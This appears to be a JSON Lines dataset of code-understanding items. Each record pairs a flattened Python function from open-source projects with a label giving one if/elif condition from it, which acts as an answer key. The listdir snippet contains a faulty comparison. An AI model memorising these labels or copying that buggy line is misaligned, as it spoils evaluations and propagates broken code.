{"input": "def Assign(left, right): names = [] if isinstance(left, ast.Name): # Single assignment on left return ast.Assign([ast.AssName(left.name, \"OP_ASSIGN\")], right) elif isinstance(left, ast.Tuple): # List of things - make sure they are Name nodes names = [] for child in left.getChildren(): if not isinstance(child, ast.Name): raise SyntaxError(\"that assignment not supported\") names.append(child.name) ass_list = [ast.AssName(name, \"OP_ASSIGN\") for name in names] return ast.Assign([ast.AssTuple(ass_list)], right) else: raise SyntaxError(\"Can't do that yet\")", "label": "if not isinstance ( child , ast . Name ) :"}
{"input": "def readVorbisComment(metadata, comment): metadata.producer = getValue(comment, \"vendor\") for item in comment.array(\"metadata\"): if \"=\" in item.value: key, value = item.value.split(\"=\", 1) key = key.upper() if key in VORBIS_KEY_TO_ATTR: key = VORBIS_KEY_TO_ATTR[key] setattr(metadata, key, value) elif value: metadata.warning(\"Skip Vorbis comment %s: %s\" % (key, value))", "label": "if \"=\" in item . value :"}
{"input": "def _read_readable(self, readable): blocksize = 8192 if self.debuglevel > 0: print(\"sendIng a read()able\") encode = self._is_textIO(readable) if encode and self.debuglevel > 0: print(\"encoding file using iso-8859-1\") while True: datablock = readable.read(blocksize) if not datablock: break if encode: datablock = datablock.encode(\"iso-8859-1\") yield datablock", "label": "if encode :"}
{"input": "def TryMerge(self, d): while 1: tt = d.getVarInt32() if tt == 12: break if tt == 18: self.set_value(d.getPrefixedString()) continue if tt == 29: self.set_flags(d.get32()) continue if tt == 0: raise ProtocolBuffer.ProtocolBufferDecodeError d.skipData(tt)", "label": "if tt == 29 :"}
{"input": "def needs_rebuild(self): for ratio in self.sprite.config[\"ratios\"]: cocos2d_path = self.output_path(ratio) if os.path.exists(cocos2d_path): try: data = plistlib.readPlist(cocos2d_path) assert data[self.meta_key][\"hash\"] == self.sprite.hash except Exception: continue return True return False", "label": "if os . path . exists ( cocos2d_path ) :"}
{"input": "def on_epoch_end(self, batch, logs=None): # At the end of every epoch, remask the weights. This ensures that when # the model is saved after completion, the weights represent mask*weights. weight_mask_ops = [] for layer in self.prunable_layers: if isinstance(layer, pruning_wrapper.PruneLowMagnitude): if tf.executing_eagerly(): layer.pruning_obj.weight_mask_op() else: weight_mask_ops.append(layer.pruning_obj.weight_mask_op()) K.batch_get_value(weight_mask_ops)", "label": "if tf . executing_eagerly ( ) :"}
{"input": "def buildQueryRE(queryText, caseSensitive, wholeWord): \"returns a RegEx pattern for searching for the given queryText\" # word detection etc. cannot be done on an encoding-less string: assert type(queryText) == unicode pattern = re.escape(queryText) if wholeWord: if re.search(\"^\\w\", queryText, re.UNICODE): pattern = \"\\\\b\" + pattern if re.search(\"\\w$\", queryText, re.UNICODE): pattern = pattern + \"\\\\b\" flags = re.UNICODE if not (caseSensitive): flags |= re.IGNORECASE return re.compile(pattern, flags)", "label": "if re . search ( \"\\w$\" , queryText , re . UNICODE ) :"}
{"input": "def is_valid_origin(origin): if not settings.SENTRY_ALLOW_ORIGIN: return False if settings.SENTRY_ALLOW_ORIGIN == \"*\": return True if not origin: return False origin = origin.lower() for value in settings.SENTRY_ALLOW_ORIGIN: if isinstance(value, string_types): if value.lower() == origin: return True else: if value.match(origin): return True return False", "label": "if value . match ( origin ) :"}
{"input": "def get_menu_title(self): handle = self.obj.get_handle() if handle: who = get_participant_from_event(self.db, handle) desc = self.obj.get_description() event_name = self.obj.get_type() if desc: event_name = \"%s - %s\" % (event_name, desc) if who: event_name = \"%s - %s\" % (event_name, who) dialog_title = _(\"Event: %s\") % event_name else: dialog_title = _(\"New Event\") return dialog_title", "label": "if who :"}
{"input": "def memory(self): if self.memory_ is None: self.lazy_init_lock_.acquire() try: if self.memory_ is None: self.memory_ = SystemStat() finally: self.lazy_init_lock_.release() return self.memory_", "label": "if self . memory_ is None :"}
{"input": "def __str__(self): fmt = \"%#x\" if isinstance(self.target, six.integer_types) else \"%r\" args = [] for arg in self.args: args.append(self._special_repr(arg)) name = self.name or (fmt % self.target) arg_str = [] for arg in args: if isinstance(arg, six.integer_types) and arg > 0x100: arg_str.append(hex(arg)) else: arg_str.append(str(arg)) return \"%s(%s)\" % (name, \", \".join(arg_str))", "label": "if isinstance ( arg , six . integer_types ) and arg > 0x100 :"}
{"input": "def change_password(username=\"flexget\", password=\"\", session=None): check = zxcvbn.zxcvbn(password, user_inputs=[username]) if check[\"score\"] < 3: warning = check[\"feedback\"][\"warning\"] suggestions = \" \".join(check[\"feedback\"][\"suggestions\"]) message = \"Password '{}' is not strong enough. \".format(password) if warning: message += warning + \" \" if suggestions: message += \"Suggestions: {}\".format(suggestions) raise WeakPassword(message) user = get_user(username=username, session=session) user.password = str(generate_password_hash(password)) session.commit()", "label": "if suggestions :"}
{"input": "def _on_workflow_object_saved(sender, instance, created, *args, **kwargs): for instance_workflow in instance.river.all(instance.__class__): if created: instance_workflow.initialize_approvals() if not instance_workflow.get_state(): init_state = getattr( instance.__class__.river, instance_workflow.field_name ).initial_state instance_workflow.set_state(init_state) instance.save()", "label": "if created :"}
{"input": "def recvmsg_into(self, buffers, *args): while True: try: if args: # The C code is sensitive about whether extra arguments are # passed or not. return self._sock.recvmsg_into(buffers, *args) return self._sock.recvmsg_into(buffers) except error as ex: if ex.args[0] != EWOULDBLOCK or self.timeout == 0.0: raise self._wait(self._read_event)", "label": "if args :"}
{"input": "def _generate_toc(line): while 1: if line.startswith(\"2\"): line = 5 while 1: if line: line = 6 break elif not line: line = 7 break elif not line: break return 1", "label": "if line . startswith ( \"2\" ) :"}
{"input": "def tearDown(self): for filename in os.listdir(from_here(\"lib\")): if filename not in self.files_to_keep: try: os.remove(from_here(\"lib\", filename)) except OSError: pass # File may no longer exist.", "label": "if filename not in self . files_to_keep :"}
{"input": "def parse_literal_object(node): value = 0 unit = get_default_weight_unit() for field in node.fields: if field.name.value == \"value\": try: value = decimal.Decimal(field.value.value) except decimal.DecimalException: raise GraphQLError(f\"Unsupported value: {field.value.value}\") if field.name.value == \"unit\": unit = field.value.value return Weight(**{unit: value})", "label": "if field . name . value == \"value\" :"}
{"input": "def run(self): to_delete = set() for k, v in iteritems(self.objs): if k.startswith(\"_\"): continue if v[\"_class\"] == \"SubmissionFormatElement\": to_delete.add(k) if v[\"_class\"] == \"Task\": v[\"submission_format\"] = list( self.objs[k][\"filename\"] for k in v.get(\"submission_format\", list()) ) for k in to_delete: del self.objs[k] return self.objs", "label": "if v [ \"_class\" ] == \"Task\" :"}
{"input": "def _detect_too_many_digits(f): ret = [] for node in f.nodes: # each node contains a list of IR instruction for ir in node.irs: # iterate over all the variables read by the IR for read in ir.read: # if the variable is a constant if isinstance(read, Constant): # read.value can return an int or a str. Convert it to str value_as_str = read.original_value if \"00000\" in value_as_str: # Info to be printed ret.append(node) return ret", "label": "if isinstance ( read , Constant ) :"}
{"input": "def split_path_info(path): # suitable for splitting an already-unquoted-already-decoded (unicode) # path value path = path.strip(\"/\") clean = [] for segment in path.split(\"/\"): if not segment or segment == \".\": continue elif segment == \"..\": if clean: del clean[-1] else: clean.append(segment) return tuple(clean)", "label": "elif segment == \"..\" :"}
{"input": "def callback(f): unfinished_children.remove(f) if not unfinished_children: try: result_list = [i.result() for i in children] except Exception: future.set_exc_info(sys.exc_info()) else: if keys is not None: future.set_result(dict(zip(keys, result_list))) else: future.set_result(result_list)", "label": "if keys is not None :"}
{"input": "def L_op(self, inputs, outputs, gout): (x,) = inputs (gz,) = gout if gz.type in complex_types: raise NotImplementedError() if outputs[0].type in discrete_types: if x.type in discrete_types: return [x.zeros_like(dtype=theano.config.floatX)] else: return [x.zeros_like()] return (gz * x * 2,)", "label": "if x . type in discrete_types :"}
{"input": "def perform_page_up(self, event): # if first line is visible then go there # (by default it doesn't move then) try: first_visible_idx = self.index(\"@0,0\") row, _ = map(int, first_visible_idx.split(\".\")) if row == 1: self.mark_set(\"insert\", \"1.0\") except Exception as e: logger.exception(\"Could not perform page up\", exc_info=e)", "label": "if row == 1 :"}
{"input": "def __str__(self): s = \"\" for k, v in self._members.items(): if isinstance(v.get(\"type\"), list): s += k + \" : \" + \";\".join(getattr(self, item)) + \"\\n\" elif isinstance(v.get(\"type\"), str): s += k + \" : \" + getattr(self, k) + \"\\n\" return s", "label": "if isinstance ( v . get ( \"type\" ) , list ) :"}
{"input": "def _shared_pool(**opts): if \"host\" in opts: key = \"%s:%s/%s\" % ( opts[\"host\"], opts[\"port\"], opts[\"db\"], ) else: key = \"%s/%s\" % (opts[\"path\"], opts[\"db\"]) pool = _pool_cache.get(key) if pool is not None: return pool with _pool_lock: pool = _pool_cache.get(key) if pool is not None: return pool pool = ConnectionPool(**opts) _pool_cache[key] = pool return pool", "label": "if pool is not None :"}
{"input": "def _override_settings(self, overriden_settings: dict): for setting_name, setting_value in overriden_settings.items(): value = setting_value if isinstance(setting_value, dict): value = getattr(self, setting_name, {}) value.update(ObjDict(setting_value)) setattr(self, setting_name, value)", "label": "if isinstance ( setting_value , dict ) :"}
{"input": "def match_tls_context(self, host: str, ir: \"IR\"): for context in ir.get_tls_contexts(): hosts = context.get(\"hosts\") or [] for context_host in hosts: if context_host == host: ir.logger.debug( \"Matched host {} with TLSContext {}\".format( host, context.get(\"name\") ) ) self.sni = True return context return None", "label": "if context_host == host :"}
{"input": "def get_form_datas(self): # Prepare the dict of initial data from the request. # We have to special-case M2Ms as a list of comma-separated PKs. if self.request_method == \"get\": initial = dict(self.request.GET.items()) for k in initial: try: f = self.opts.get_field(k) except models.FieldDoesNotExist: continue if isinstance(f, models.ManyToManyField): initial[k] = initial[k].split(\",\") return {\"initial\": initial} else: return {\"data\": self.request.POST, \"files\": self.request.FILES}", "label": "if isinstance ( f , models . ManyToManyField ) :"}
{"input": "def run_until(loop, pred, timeout=30): deadline = time.time() + timeout while not pred(): if timeout is not None: timeout = deadline - time.time() if timeout <= 0: raise futures.TimeoutError() loop.run_until_complete(tasks.sleep(0.001, loop=loop))", "label": "if timeout is not None :"}
{"input": "def update_translations(): pot_path = os.path.join(root, \"messages.pot\") template = read_po(open(pot_path, \"rb\")) for locale in get_locales(): po_path = os.path.join(root, locale, \"messages.po\") mo_path = os.path.join(root, locale, \"messages.mo\") if os.path.exists(po_path): catalog = read_po(open(po_path, \"rb\")) catalog.update(template) f = open(po_path, \"wb\") write_po(f, catalog) f.close() print(\"updated\", po_path) compile_translations()", "label": "if os . path . exists ( po_path ) :"}
{"input": "def get_queryset_for_content_type(self, content_type_id): \"\"\"Return the QuerySet from the QuerySetSequence for a ctype.\"\"\" content_type = ContentType.objects.get_for_id(content_type_id) for queryset in self.queryset.get_querysets(): if queryset.model.__name__ == \"QuerySequenceModel\": # django-queryset-sequence 0.7 support dynamically created # QuerySequenceModel which replaces the original model when it # patches the queryset since 6394e19 model = queryset.model.__bases__[0] else: model = queryset.model if model == content_type.model_class(): return queryset", "label": "if queryset . model . __name__ == \"QuerySequenceModel\" :"}
{"input": "def __bypass_wizard(self): bypass = False if self.device.remote_op.dir_exist(self.project_folder): msg = \"A Tweak with the same PROJECT_NAME ({}) already exists. Do you want to delete it and start from scratch?\".format( self.options[\"project_name\"] ) clean = choose_boolean(msg) if clean: self.device.remote_op.dir_delete(self.project_folder) else: bypass = True return bypass", "label": "if clean :"}
{"input": "def wrapper(cached=True, reset=False): nonlocal cached_venv_dir if not cached or not cached_venv_dir or reset: venv_dir = os.environ.get(\"_VENV_DIR_\") or load_settings(lazy=True).get( \"venv_dir\" ) if venv_dir: # no cov if venv_dir == \"isolated\": venv_dir = VENV_DIR_ISOLATED elif venv_dir == \"shared\": venv_dir = VENV_DIR_SHARED else: # no cov venv_dir = VENV_DIR_SHARED cached_venv_dir = venv_dir return cached_venv_dir", "label": "elif venv_dir == \"shared\" :"}
{"input": "def run(self): while not self._stop: for i in range(0, self._interval): time.sleep(1) if self._stop: self.__logger.debug(\"%s - ping thread stopped\" % self.name) return ping = PingIqProtocolEntity() self._layer.waitPong(ping.getId()) if not self._stop: self._layer.sendIq(ping)", "label": "if self . _stop :"}
{"input": "def install(self, unicode=False, names=None): import __builtin__ __builtin__.__dict__[\"_\"] = unicode and self.ugettext or self.gettext if hasattr(names, \"__contains__\"): if \"gettext\" in names: __builtin__.__dict__[\"gettext\"] = __builtin__.__dict__[\"_\"] if \"ngettext\" in names: __builtin__.__dict__[\"ngettext\"] = ( unicode and self.ungettext or self.ngettext ) if \"lgettext\" in names: __builtin__.__dict__[\"lgettext\"] = self.lgettext if \"lngettext\" in names: __builtin__.__dict__[\"lngettext\"] = self.lngettext", "label": "if \"ngettext\" in names :"}
{"input": "def on_task_output(self, task, config): for entry in task.entries: if \"torrent\" in entry: if entry[\"torrent\"].modified: # re-write data into a file log.debug(\"Writing modified torrent file for %s\" % entry[\"title\"]) with open(entry[\"file\"], \"wb+\") as f: f.write(entry[\"torrent\"].encode())", "label": "if entry [ \"torrent\" ] . modified :"}
{"input": "def batchSites(self, sites): i = 0 res = list() siteList = list() for site in sites: if i >= self.opts[\"_maxthreads\"]: data = self.threadSites(siteList) if data is None: return res for ret in list(data.keys()): if data[ret]: # bucket:filecount res.append(f\"{ret}:{data[ret]}\") i = 0 siteList = list() siteList.append(site) i += 1 return res", "label": "if i >= self . opts [ \"_maxthreads\" ] :"}
{"input": "def width_pixels(self): w = self.style_width if self._absolute_size and w == \"auto\": w = self._absolute_size.width if type(w) is NumberUnit: if self._relative_element == self: rew = self._parent_size.width if self._parent_size else 0 elif self._relative_element is None: rew = 0 else: rew = self._relative_element.width_pixels if rew == \"auto\": rew = 0 w = w.val(base=rew) return w", "label": "if rew == \"auto\" :"}
{"input": "def get_lang3(lang): try: if len(lang) == 2: ret_value = get(part1=lang).part3 elif len(lang) == 3: ret_value = lang else: ret_value = \"\" except KeyError: ret_value = lang return ret_value", "label": "if len ( lang ) == 2 :"}
{"input": "def update_timer(): global _timer if (time.time() - os.stat(config.TRAILS_FILE).st_mtime) >= config.UPDATE_PERIOD: _ = None while True: _ = load_trails(True) if _: trails.clear() trails.update(_) break else: time.sleep(LOAD_TRAILS_RETRY_SLEEP_TIME) _timer = threading.Timer(config.UPDATE_PERIOD, update_timer) _timer.start()", "label": "if _ :"}
{"input": "def __call__(self, model): if hasattr(model, \"module\"): model = model.module conv1_lr_mult = self.paramwise_cfg.get(\"conv1_lr_mult\", 1.0) params = [] for name, param in model.named_parameters(): param_group = {\"params\": [param]} if name.startswith(\"conv1\") and param.requires_grad: param_group[\"lr\"] = self.base_lr * conv1_lr_mult params.append(param_group) optimizer_cfg[\"params\"] = params return build_from_cfg(optimizer_cfg, OPTIMIZERS)", "label": "if name . startswith ( \"conv1\" ) and param . requires_grad :"}
{"input": "def _get_conf(self): conf = {} # the configuration once all conf files are merged for path in map(Path, self.template_paths): conf_path = path / \"conf.json\" if conf_path.exists(): with conf_path.open() as f: conf = recursive_update(conf, json.load(f)) return conf", "label": "if conf_path . exists ( ) :"}
{"input": "def _base_keywords(self, fw_version=False, image=False): keywords = dict() if image: keywords[\"image_uri\"] = \"'my:image'\" if fw_version: keywords[\"framework_version\"] = ( \"fw_version\" if fw_version == \"named\" else \"'{}'\".format(self.framework_version) ) return keywords", "label": "if fw_version == \"named\""}
{"input": "def check_grads(grads_and_vars): has_nan_ops = [] amax_ops = [] for grad, _ in grads_and_vars: if grad is not None: if isinstance(grad, tf.IndexedSlices): x = grad.values else: x = grad has_nan_ops.append(tf.reduce_any(tf.is_nan(x))) amax_ops.append(tf.reduce_max(tf.abs(x))) has_nan = tf.reduce_any(has_nan_ops) amax = tf.reduce_max(amax_ops) return has_nan, amax", "label": "if isinstance ( grad , tf . IndexedSlices ) :"}
{"input": "def new_org(type=ORG_DEFAULT, block=True, **kwargs): if type == ORG_DEFAULT: org = reserve_pooled(type=type, **kwargs) if not org: org = queue.reserve(\"queued_org\", block=block, type=type, **kwargs) if org: new_pooled() return org org = Organization(type=type, **kwargs) org.initialize() org.commit() return org else: org = Organization(type=type, **kwargs) org.queue_initialize(block=block) return org", "label": "if org :"}
{"input": "def _consumer_healthy(self): abnormal_num = 0 for w in self._consumers: if not w.is_alive() and w.id not in self._consumer_endsig: abnormal_num += 1 if self._use_process: errmsg = \"consumer[{}] exit abnormally with exitcode[{}]\".format( w.pid, w.exitcode ) else: errmsg = \"consumer[{}] exit abnormally\".format(w.ident) logger.warn(errmsg) if abnormal_num > 0: logger.warn(\"{} consumers have exited abnormally!!!\".format(abnormal_num)) return abnormal_num == 0", "label": "if not w . is_alive ( ) and w . id not in self . _consumer_endsig :"}
{"input": "def add_data_source(self, f=None, s_name=None, source=None, module=None, section=None): try: if module is None: module = self.name if section is None: section = \"all_sections\" if s_name is None: s_name = f[\"s_name\"] if source is None: source = os.path.abspath(os.path.join(f[\"root\"], f[\"fn\"])) report.data_sources[module][section][s_name] = source except AttributeError: logger.warning( \"Tried to add data source for {}, but was missing fields data\".format( self.name ) )", "label": "if module is None :"}
{"input": "def startTest(self, test): unittest.TestResult.startTest(self, test) current_case = test.test.__class__.__name__ if self.showAll: if current_case != self._last_case: self.stream.writeln(current_case) self._last_case = current_case self.stream.write(\" %s\" % str(test.test._testMethodName).ljust(60)) self.stream.flush()", "label": "if current_case != self . _last_case :"}
{"input": "def _calc_freq(item): try: if ao_index is not None and ro_index is not None: ao = sum([int(x) for x in item.split(\":\")[ao_index].split(\",\")]) ro = int(item.split(\":\")[ro_index]) freq = ao / float(ao + ro) elif af_index is not None: freq = float(item.split(\":\")[af_index]) else: freq = 0.0 except (IndexError, ValueError, ZeroDivisionError): freq = 0.0 return freq", "label": "if ao_index is not None and ro_index is not None :"}
{"input": "def contains_version(self, version): \"\"\"Returns True if version is contained in this range.\"\"\" if len(self.bounds) < 5: # not worth overhead of binary search for bound in self.bounds: i = bound.version_containment(version) if i == 0: return True if i == -1: return False else: _, contains = self._contains_version(version) return contains return False", "label": "if i == 0 :"}
{"input": "def _codegen_impl(self, state: CodegenState, default_semicolon: bool = False) -> None: with state.record_syntactic_position(self): state.add_token(\"global\") self.whitespace_after_global._codegen(state) last_name = len(self.names) - 1 for i, name in enumerate(self.names): name._codegen(state, default_comma=(i != last_name)) semicolon = self.semicolon if isinstance(semicolon, MaybeSentinel): if default_semicolon: state.add_token(\"; \") elif isinstance(semicolon, Semicolon): semicolon._codegen(state)", "label": "if default_semicolon :"}
{"input": "def getLatestXci(self, version=None): highest = None for nsp in self.getFiles(): try: if nsp.path.endswith(\".xci\"): if version is not None and nsp.version == version: return nsp if not highest or int(nsp.version) > int(highest.version): highest = nsp except BaseException: pass return highest", "label": "if nsp . path . endswith ( \".xci\" ) :"}
{"input": "def _process_iter(self, line_iter): samples = [] buf = [] for line in line_iter: if not buf and line.startswith(\"#\") and self._has_comment: continue line = line.split() if line: buf.append(line) elif buf: samples.append(tuple(map(list, zip(*buf)))) buf = [] if buf: samples.append(tuple(map(list, zip(*buf)))) return samples", "label": "elif buf :"}
{"input": "def examine_tree(tree): for node in tree.post_order(): if isinstance(node, pytree.Leaf): continue print(repr(str(node))) verdict = raw_input() if verdict.strip(): print(find_pattern(node)) return", "label": "if isinstance ( node , pytree . Leaf ) :"}
{"input": "def foundNestedPseudoClass(self): i = self.pos + 1 openParen = 0 while i < len(self.source_text): ch = self.source_text[i] if ch == \"{\": return True elif ch == \"(\": # pseudoclasses can contain () openParen += 1 elif ch == \")\": if openParen == 0: return False openParen -= 1 elif ch == \";\" or ch == \"}\": return False i += 1 return False", "label": "elif ch == \";\" or ch == \"}\" :"}
{"input": "def scan_resource_conf(self, conf): self.evaluated_keys = \"user_data\" if \"user_data\" in conf.keys(): user_data = conf[\"user_data\"][0] if isinstance(user_data, str): if string_has_secrets(user_data): return CheckResult.FAILED return CheckResult.PASSED", "label": "if isinstance ( user_data , str ) :"}
{"input": "def strip_suffixes(path: str) -> str: t = path while True: if t.endswith(\".xz\"): t = t[:-3] elif t.endswith(\".raw\"): t = t[:-4] elif t.endswith(\".tar\"): t = t[:-4] elif t.endswith(\".qcow2\"): t = t[:-6] else: break return t", "label": "elif t . endswith ( \".qcow2\" ) :"}
{"input": "def classify(self, url, text): for match in self.rules.match(data=text): if (url, match) in self.matches: continue self.matches.append((url, match)) if self.discard_url_match(url, match): # pragma: no cover continue self.handle_match_etags(match) rule = match.rule meta = match.meta tags = \",\".join([\" \".join(t.split(\"_\")) for t in match.tags]) log.ThugLogging.log_classifier(\"text\", url, rule, tags, meta) for c in self.custom_classifiers: self.custom_classifiers[c](url, text)", "label": "if self . discard_url_match ( url , match ) :"}
{"input": "def is_symmetric_iterative(root): if root is None: return True stack = [[root.left, root.right]] while stack: left, right = stack.pop() # popleft if left is None and right is None: continue if left is None or right is None: return False if left.val == right.val: stack.append([left.left, right.right]) stack.append([left.right, right.left]) else: return False return True", "label": "if left is None and right is None :"}
{"input": "def __str__(self): if self.looptype.is_pretest: if self.false in self.loop_nodes: return \"%d-While(!%s)[%s]\" % (self.num, self.name, self.cond) return \"%d-While(%s)[%s]\" % (self.num, self.name, self.cond) elif self.looptype.is_posttest: return \"%d-DoWhile(%s)[%s]\" % (self.num, self.name, self.cond) elif self.looptype.is_endless: return \"%d-WhileTrue(%s)[%s]\" % (self.num, self.name, self.cond) return \"%d-WhileNoType(%s)\" % (self.num, self.name)", "label": "if self . false in self . loop_nodes :"}
{"input": "def listdir(path=\".\"): is_bytes = isinstance(path, bytes) res = [] for dirent in ilistdir(path): fname = dirent[0] if is_bytes: good = fname != b\".\" and fname == b\"..\" else: good = fname != \".\" and fname != \"..\" if good: if not is_bytes: fname = fsdecode(fname) res.append(fname) return res", "label": "if not is_bytes :"}
{"input": "def exitval_from_opts(options, project): exit_value_from = options.get(\"--exit-code-from\") if exit_value_from: if not options.get(\"--abort-on-container-exit\"): log.warning(\"using --exit-code-from implies --abort-on-container-exit\") options[\"--abort-on-container-exit\"] = True if exit_value_from not in [s.name for s in project.get_services()]: log.error( 'No service named \"%s\" was found in your compose file.', exit_value_from ) sys.exit(2) return exit_value_from", "label": "if not options . get ( \"--abort-on-container-exit\" ) :"}
{"input": "def shrink(self): Node.shrink(self) if self.size < NUM_SIZE_LEVELS: if self.glue_spec.width != 0.0: self.glue_spec = self.glue_spec.copy() self.glue_spec.width *= SHRINK_FACTOR", "label": "if self . glue_spec . width != 0.0 :"}
{"input": "def _clean_text(self, text): \"\"\"Performs invalid character removal and whitespace cleanup on text.\"\"\" output = [] for char in text: cp = ord(char) if cp == 0 or cp == 0xFFFD or _is_control(char): continue if _is_whitespace(char): output.append(\" \") else: output.append(char) return \"\".join(output)", "label": "if _is_whitespace ( char ) :"}
{"input": "def config_update(self, *updates): filename = os.path.join(self.path, \".git\", \"config\") with GitConfigParser(file_or_files=filename, read_only=False) as config: for section, key, value in updates: try: old = config.get(section, key) if value is None: config.remove_option(section, key) continue if old == value: continue except (NoSectionError, NoOptionError): pass if value is not None: config.set_value(section, key, value)", "label": "if old == value :"}
{"input": "def generate_securecc_object(args): obj, phony_obj = args if not os.path.exists(obj): shutil.copy(phony_obj, obj) else: digest = blade_util.md5sum_file(obj) phony_digest = blade_util.md5sum_file(phony_obj) if digest != phony_digest: shutil.copy(phony_obj, obj)", "label": "if digest != phony_digest :"}
{"input": "def process_request(self, request): for old, new in self.names_name: request.uri = request.uri.replace(old, new) if is_text_payload(request) and request.body: try: body = ( str(request.body, \"utf-8\") if isinstance(request.body, bytes) else str(request.body) ) except TypeError: # python 2 doesn't allow decoding through str body = str(request.body) if old in body: request.body = body.replace(old, new) return request", "label": "if isinstance ( request . body , bytes )"}
{"input": "def _apply_regex(self, regex, input): import re re_match = re.match(regex, input) if re_match and any(re_match.groups()): kwargs = {} has_val = False for k, v in re_match.groupdict(default=\"0\").items(): val = int(v) if val > -1: has_val = True kwargs[k] = val if has_val: return datetime.timedelta(**kwargs)", "label": "if has_val :"}
{"input": "def test_method_mismatch(): line = \"def {}(self\" skip_files = [\"__init__.py\", \"i3pystatus.py\"] errors = [] for _file in sorted(MODULE_PATH.iterdir()): if _file.suffix == \".py\" and _file.name not in skip_files: with _file.open() as f: if f\"def {_file.stem}(self\" not in f.read(): errors.append((_file.stem, _file)) if errors: line = \"Method mismatched error(s) detected!\\n\\n\" for error in errors: line += \"Method `{}` is not in module `{}`\\n\".format(*error) print(line[:-1]) assert False", "label": "if f\"def {_file.stem}(self\" not in f . read ( ) :"}
{"input": "def iter_flat(self): for f in self.layout: e = getattr(self, f[0]) if isinstance(e, Signal): if len(f) == 3: yield e, f[2] else: yield e, DIR_NONE elif isinstance(e, Record): yield from e.iter_flat() else: raise TypeError", "label": "if isinstance ( e , Signal ) :"}
{"input": "def _identify_csv_files(self, csv_dir): try: # get all CSV files product_csvs = [ csv_filename for csv_filename in os.listdir(csv_dir) if csv_filename.endswith(\".csv\") ] except FileNotFoundError as not_found: product_csvs = [] # double check that exception is on templates/csv directory if not_found.filename != csv_dir: raise not_found return product_csvs", "label": "if not_found . filename != csv_dir :"}
{"input": "def gen_new_segments(datadir, spk_list): if not os.path.isfile(os.path.join(datadir, \"segments\")): raise ValueError(\"no segments file found in datadir\") new_segments = open(os.path.join(datadir, \"new_segments\"), \"w\", encoding=\"utf-8\") segments = open(os.path.join(datadir, \"segments\"), \"r\", encoding=\"utf-8\") while True: line = segments.readline() if not line: break spk = line.split(\"_\")[0] if spk in spk_list: new_segments.write(line) new_segments.close(), segments.close()", "label": "if not line :"}
{"input": "def colorspace(self): \"\"\"PDF name of the colorspace that best describes this image\"\"\" if self.image_mask: return None # Undefined for image masks if self._colorspaces: if self._colorspaces[0] in self.SIMPLE_COLORSPACES: return self._colorspaces[0] if self._colorspaces[0] in (\"/DeviceCMYK\", \"/ICCBased\"): return self._colorspaces[0] if ( self._colorspaces[0] == \"/Indexed\" and self._colorspaces[1] in self.SIMPLE_COLORSPACES ): return self._colorspaces[1] raise NotImplementedError( \"not sure how to get colorspace: \" + repr(self._colorspaces) )", "label": "if self . _colorspaces [ 0 ] in self . SIMPLE_COLORSPACES :"}
{"input": "def handle_bytes(self, event): self.bytes += event.data # todo: we may want to guard the size of self.bytes and self.text if event.message_finished: self.queue.put_nowait({\"type\": \"websocket.receive\", \"bytes\": self.bytes}) self.bytes = b\"\" if not self.read_paused: self.read_paused = True self.transport.pause_reading()", "label": "if not self . read_paused :"}
{"input": "def get_latest_tasks(cls, tasks): tasks_group = {} for task in tasks: task_key = cls.task_key( task_id=task.f_task_id, role=task.f_role, party_id=task.f_party_id ) if task_key not in tasks_group: tasks_group[task_key] = task elif task.f_task_version > tasks_group[task_key].f_task_version: # update new version task tasks_group[task_key] = task return tasks_group", "label": "if task_key not in tasks_group :"}
{"input": "def determine_load_order(): dependencies = TypeMapItem._get_dependencies() ordered = dict() while dependencies: found_next = False for type_name, unloaded in dependencies.items(): if not unloaded: ordered[type_name] = len(ordered) found_next = True break if found_next is False: raise Exception(\"recursive loading dependency\") dependencies.pop(type_name) for unloaded in dependencies.values(): unloaded.discard(type_name) return ordered", "label": "if found_next is False :"}
{"input": "def _find_gist_with_file(user, filename, env): import requests # expensive page = 1 url = \"https://api.github.com/users/%s/gists\" % user while True: resp = requests.get( url, params={\"page\": page, \"per_page\": 100}, headers=_github_auth_headers(env), ) gists = resp.json() if not gists: return None for gist in gists: for name in gist[\"files\"]: if name == filename: return gist page += 1", "label": "if not gists :"}
{"input": "def _expand_dim_shape_func(data_shape, ndim, axis, num_newaxis): out = output_tensor((ndim + num_newaxis,), \"int64\") for i in const_range(out.shape[0]): if i < axis: out[i] = data_shape[i] elif i < axis + num_newaxis: out[i] = int64(1) else: out[i] = data_shape[i - num_newaxis] return out", "label": "if i < axis :"}
{"input": "def check_graph(self, graph, verify, interactive): if verify and not os.path.exists(self._target_folder): raise ConanException(\"Manifest folder does not exist: %s\" % self._target_folder) for node in graph.ordered_iterate(): if node.recipe in (RECIPE_CONSUMER, RECIPE_VIRTUAL): continue self._handle_recipe(node, verify, interactive) self._handle_package(node, verify, interactive)", "label": "if node . recipe in ( RECIPE_CONSUMER , RECIPE_VIRTUAL ) :"}
{"input": "def when(self, matches, context): to_remove = [] for filepart in matches.markers.named(\"path\"): patterns = defaultdict(list) for match in reversed( matches.range( filepart.start, filepart.end, predicate=lambda m: \"weak-duplicate\" in m.tags, ) ): if match.pattern in patterns[match.name]: to_remove.append(match) else: patterns[match.name].append(match.pattern) return to_remove", "label": "if match . pattern in patterns [ match . name ] :"}
{"input": "def __call__(self, session_path): \"\"\"Get raw session object from `session_path`.\"\"\" new_session = copy.deepcopy(self._template) session_keys = new_session.keys() old_session = self._load_file(session_path) for attribute in dir(self): if attribute.startswith(\"set_\"): target = attribute[4:].capitalize() if target not in session_keys: raise ValueError(\"Invalid attribute: %r\" % attribute) function = getattr(self, attribute) new_session[target] = function(old_session) return new_session", "label": "if target not in session_keys :"}
{"input": "def set_recent_terminal(cls, view): terminal = Terminal.from_id(view.id()) if not terminal: return logger.debug(\"set recent view: {}\".format(view.id())) panel_name = terminal.panel_name if panel_name and panel_name != EXEC_PANEL: window = panel_window(view) if window: cls._recent_panel[window.id()] = panel_name cls._recent_view[window.id()] = view else: window = view.window() if window: cls._recent_view[window.id()] = view", "label": "if window :"}
{"input": "def _testValue(self, value, idx): if self.__singleTypeConstraint: self.__singleTypeConstraint(value) elif self.__multipleTypeConstraint: if idx not in self.__multipleTypeConstraint: raise error.ValueConstraintError(value) constraint, status = self.__multipleTypeConstraint[idx] if status == \"ABSENT\": # XXX presense is not checked! raise error.ValueConstraintError(value) constraint(value)", "label": "if status == \"ABSENT\" :"}
{"input": "def SaveIfUnsure(self): if self.ed.Modify: msg = 'Save changes to \"' + self.fullPath + '\"?' print(msg) decision = self.DisplayMessage(msg, True) if decision: self.CmdSave() return decision return True", "label": "if decision :"}
